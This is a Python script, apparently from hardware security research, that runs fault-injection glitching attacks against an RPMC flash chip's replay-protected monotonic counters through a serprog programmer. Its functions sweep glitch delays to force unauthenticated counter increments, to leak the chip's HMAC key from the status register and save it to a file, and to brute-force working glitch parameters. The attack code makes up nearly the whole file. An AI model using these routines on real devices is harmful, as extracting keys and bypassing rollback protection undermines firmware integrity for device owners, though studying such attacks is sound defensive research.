import time

from serprog import Serprog
from rpmc_ops import *
from datetime import datetime
import math
from collections import Counter

test_key = b'\xff' * 32

def entropy(s: bytes) -> float:
        return -sum((count / len(s)) * math.log2(count / len(s)) for count in Counter(s).values())


def pretty_print_status(status: bytes):
    assert len(status) == 49

    print(f'Status: {bin(status[0])}\n'
          f'Tag: {status[1:13].hex()}\n'
          f'Value: {int.from_bytes(status[13:17], byteorder='big')}\n'
          f'Signature: {status[17:].hex()}')


def glitch_increment_counter(target_counter: int, attempts: int = 1):
    key_data = b'\x00\x00\x00\x00'
    key = HMAC(test_key, key_data, hashlib.sha256).digest()

    chip = Serprog('/dev/ttyACM0', 1_000_000)

    rpmc_update_hmac_key(chip, key, target_counter, key_data)
    previous_value = rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
    print(f'Current counter value: {previous_value}')

    increment_counter_msg = b'\x9b\x02' + target_counter.to_bytes(1)+ b'\x00' + previous_value.to_bytes(4, byteorder='big')
    signature = HMAC(key, increment_counter_msg, hashlib.sha256)
    print(f'Signature to look for {signature.hexdigest()}')

    msg = increment_counter_msg + b'\x42' * 32
    print(f'Sending: {msg.hex()}')
    start = datetime.now()

    success = 0
    for attempt in range(attempts):
        print(f'Try {attempt}')
        for glitch_cycles in range(6080, 6220):
            # This message could also be captured and replayed in a real attack
            rpmc_update_hmac_key(chip, key, target_counter, key_data)

            print(f'Glitching after {glitch_cycles}:')
            chip.exchange(msg, 0, glitch_cycles)
            try:
                rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
            except:

                print('Get failed dumping status:')
                full_status = rpmc_get_status(chip)
                pretty_print_status(full_status)
                if full_status.endswith(signature.digest()):
                    print(f'Found correct signature')
                    success += 1
                    break

    print(f'Took {(datetime.now() - start).microseconds}us for {attempts} attempt(s)')
    print(f'Success rate: {success / attempts}')


def leak_hmac_key(target_counter: int, key_data: bytes):
    start = datetime.now()
    # This key is just needed to compare the results against
    key = HMAC(test_key, key_data, hashlib.sha256).digest()
    print(f'Trying to leak the hmac key for "{key_data}"\n'
          f'Looking for {key.hex()}')

    chip = Serprog('/dev/ttyACM0', 1_000_000)
    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data #+ b'\x42' * 32
    msg += HMAC(key, msg, hashlib.sha256).digest()

    for glitch_cycles in range(7300, 7800):
        for _ in range(10):
            chip.exchange(msg, 0, glitch_cycles)
            try:
                rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
            except RuntimeError as e:
                full_status = rpmc_get_status(chip)
                signature = full_status[-32:]
                if entropy(signature) != 0.0:
                    print(f'Delay {glitch_cycles}: {e}')
                    pretty_print_status(full_status)
                    print(f'Key candidate {signature.hex()}')
                    try:
                        rpmc_update_hmac_key(chip, signature, target_counter, key_data)
                        print(f'Key {signature.hex()} works for counter {target_counter}')
                        with open(f'key_slot_{target_counter}_{key_data.hex()}.bin', 'wb') as f:
                            f.write(signature)
                        break
                    except RuntimeError as e:
                        print(e)

            except TimeoutError as e:
                print(f'Delay {glitch_cycles}: {e}')
                full_status = rpmc_get_status(chip)
                pretty_print_status(full_status)
                break

    print(f'Took {(datetime.now() - start).microseconds}us')

"""
This program is meant to be used together with the glitch_finder pico program to quickly try a bunch of different
glitch delays
"""
def brute_force_space(target_counter: int, debug: bool = False):
    print('Trying to brute force working parameter')

    chip = Serprog('/dev/ttyACM0', 1_000_000)
    key_data = b'\x00\x00\x00\x00'
    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data + b'\x42' * 32

    for _ in range(10):
        for glitch_cycles in range(7500, 7600):
            for delay in range(10):
                chip.exchange(msg, 0, glitch_cycles)
                try:
                    rpmc_get_counter(chip, b'\xff' * 32, target_counter, tag=b'\xaa' * 12)
                except RuntimeError as e:
                    full_status = rpmc_get_status(chip)
                    signature = full_status[-32:]
                    # if the glitch doesn't work the signature field of the status contains the signature we sent in our message
                    if entropy(signature) != 0.0 or debug:
                        pretty_print_status(full_status)
                        print(f'{glitch_cycles} + {delay}: found possible hmac key {signature.hex()} for key data {key_data.hex()}')
                except TimeoutError:
                    print(f'{glitch_cycles} + {delay}: delay seems interesting chip timed out')
                    return


def glitch_get(target_counter: int):
    print(f'Looking for impact of glitching on get')
    chip = Serprog('/dev/ttyACM0', 1_000_000)
    key = HMAC(test_key, b'\x00\x00\x00\x00', hashlib.sha256).digest()
    rpmc_update_hmac_key(chip, key, target_counter, b'\x00\x00\x00\x00')
    baseline = rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
    base_status = rpmc_get_status(chip)

    for _ in range(1):
        for glitch_cycles in range(7000, 10000):
            for delay in range(0, 30, 2):
                rpmc_update_hmac_key(chip, key, target_counter, b'\x00\x00\x00\x00')
                try:
                    val = rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12, glitch_cycles=glitch_cycles)
                    if val != baseline:
                        print(f'Delay {glitch_cycles} + {delay}: Value differs {val} != {baseline}')
                        return
                except RuntimeError as e:
                    print(f'Delay {glitch_cycles} + {delay}: {e}')
                    full_status = rpmc_get_status(chip)
                    if entropy(full_status) != 0.0 and full_status[1:] != base_status[1:]:
                        pretty_print_status(full_status)
                except TimeoutError:
                    print(f'Delay {glitch_cycles} + {delay}: Timeout')
                    return

if __name__ == '__main__':
    #glitch_increment_counter(0)
    #leak_hmac_key(0, b'\x00\x00\x00\x00')
    #brute_force_space(0, debug=False)
    glitch_get(0)
